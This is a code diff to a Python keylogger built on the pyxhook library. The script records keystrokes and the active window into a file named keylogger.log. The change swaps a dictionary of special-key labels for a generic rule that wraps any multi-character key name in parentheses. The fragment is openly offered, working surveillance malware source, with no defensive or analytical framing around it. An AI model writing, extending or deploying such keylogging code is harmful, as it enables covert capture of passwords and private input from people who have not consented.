@@ -2,11 +2,10 @@ import pyxhook
 import time
 
 def stringreplace(s):
-    global special_strings
     if(s==None):
         return ""
-    elif(s in special_strings):
-        return special_strings[s]
+    elif(len(s)>1):
+        return ("("+s+")")
     return s
 
 def keystroke(event):
@@ -35,11 +34,7 @@ def keystroke(event):
     text_file.close()
     
 text_file = open("./keylogger.log", "a")
-special_strings = {
-    "BackSpace":"(back)", "Return":"(enter)", "space":"(space)", "Shift_R" :"(S_R)","Shift_L":"(S_L)", "Control_L":"(Ctrl_l)",
-    "Tab":"(tab)","Control_R":"(Ctrl_R)", "Alt_R":"(Alt_r)", "Alt_L" :"(Alt_l)", "Left":"(left)", "Right":"(right)", "Up":"(up)",
-    "Down": "(down)", "Escape":"(escape)", "Super_L":"(super)", "colon":":"
-    }
+
 flag, count, sequence, out, prev_window = 0, 0, 0, "", "" ,
 
 if(__name__ == "__main__"):
